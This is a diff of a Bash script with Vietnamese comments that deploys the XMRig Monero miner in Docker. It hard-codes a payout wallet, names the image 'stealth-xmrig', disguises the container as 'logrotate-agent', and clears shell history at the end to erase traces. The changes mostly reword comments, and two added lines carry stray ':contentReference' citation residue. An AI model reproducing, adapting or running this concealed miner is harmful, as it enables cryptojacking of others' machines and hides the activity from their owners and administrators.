@@ -6,17 +6,17 @@ command -v curl >/dev/null || { echo "❌ curl chưa cài."; exit 1; }
 command -v bc >/dev/null || { echo "❌ bc chưa cài. Cài đặt bc..."; sudo apt-get update && sudo apt-get install -y bc; }
 
 # ========== CẤU HÌNH ========== 
-WALLET=${WALLET:-85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz}
-CONTAINER_NAME=${CONTAINER_NAME:-logrotate-agent}
-IMAGE_NAME=${IMAGE_NAME:-stealth-xmrig}
+WALLET=${WALLET:-85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz} 
+CONTAINER_NAME=${CONTAINER_NAME:-logrotate-agent} 
+IMAGE_NAME=${IMAGE_NAME:-stealth-xmrig} 
 
 # ========== LẤY SỐ CORE CPU VÀ TÍNH THREAD_HINT ========== 
-CPU_CORES=$(nproc)                               # Số core vật lý/logical
-THREAD_HINT=$(echo "$CPU_CORES * 0.8" | bc)      # Sử dụng 80% số core
+CPU_CORES=$(nproc)                              # Lấy số lượng lõi CPU
+THREAD_HINT=$(echo "$CPU_CORES * 0.8" | bc)     # Dùng 80% lõi
 
-# ========== CÀI ĐẶT URL VÀ HASH CHO BẢN XMRIG LINUX ========== 
-XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"
-EXPECTED_SHA256="b2c88b19699e3d22c4db0d589f155bb89efbd646ecf9ad182ad126763723f4b7"
+# ========== URL VÀ SHA256 CỦA BẢN XMRig LINUX STATIC ========== 
+XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz"  # :contentReference[oaicite:0]{index=0}
+EXPECTED_SHA256="b2c88b19699e3d22c4db0d589f155bb89efbd646ecf9ad182ad126763723f4b7"                         # :contentReference[oaicite:1]{index=1}
 
 # ========== DỌN DẸP CŨ ========== 
 docker rm -f "$CONTAINER_NAME" 2>/dev/null
@@ -36,27 +36,26 @@ WORKDIR=$(mktemp -d)
 cd "$WORKDIR" || exit 1
 
 # ========== TẢI VÀ KIỂM TRA HASH ========== 
-echo "[*] Tải XMRig Linux..."
+echo "[*] Tải XMRig Linux static..."
 curl -L -o xmrig.tar.gz "$XMRIG_URL"
 
 ACTUAL_SHA256=$(sha256sum xmrig.tar.gz | awk '{ print $1 }')
 if [ "$ACTUAL_SHA256" != "$EXPECTED_SHA256" ]; then
-  echo "❌ Hash không khớp. File tải về bị thay đổi."
+  echo "❌ Hash không khớp (đã tải: $ACTUAL_SHA256). File có thể bị sửa đổi."
   exit 1
 fi
-echo "[✓] Hash kiểm tra thành công."
+echo "[✓] Đã kiểm tra SHA256 thành công."
 
 # ========== GIẢI NÉN VÀ DI CHUYỂN BINARY ========== 
 tar -xf xmrig.tar.gz
 
-# Kiểm tra xem binary tồn tại
-XMRIG_BIN_PATH=$(find . -type f -name xmrig | head -n1)
-if [ -z "$XMRIG_BIN_PATH" ]; then
+XMRIG_BIN=$(find . -type f -name xmrig | head -n1)
+if [ -z "$XMRIG_BIN" ]; then
   echo "❌ Không tìm thấy binary xmrig sau khi giải nén."
   exit 1
 fi
 
-mv "$XMRIG_BIN_PATH" ./xmrig
+mv "$XMRIG_BIN" ./xmrig
 chmod +x ./xmrig
 
 # ========== TẠO FILE CẤU HÌNH ========== 
@@ -99,7 +98,7 @@ EOF
 echo "[*] Build Docker image..."
 docker build -t "$IMAGE_NAME" . || { echo "❌ Build thất bại"; exit 1; }
 
-# ========== RUN CONTAINER ========== 
+# ========== CHẠY CONTAINER ========== 
 echo "[*] Chạy container '$CONTAINER_NAME'..."
 docker run -d --name "$CONTAINER_NAME" \
   --cpus="0.8" --memory="20000m" \
@@ -108,7 +107,7 @@ docker run -d --name "$CONTAINER_NAME" \
   --log-driver=syslog \
   "$IMAGE_NAME"
 
-# ========== DỌN DẸP VÀ XOÁ DẤU VẾT ========== 
+# ========== XOÁ DỌN DUYỆT VÀ LỊCH SỬ ========== 
 cd ~
 rm -rf "$WORKDIR"
 history -c && history -w
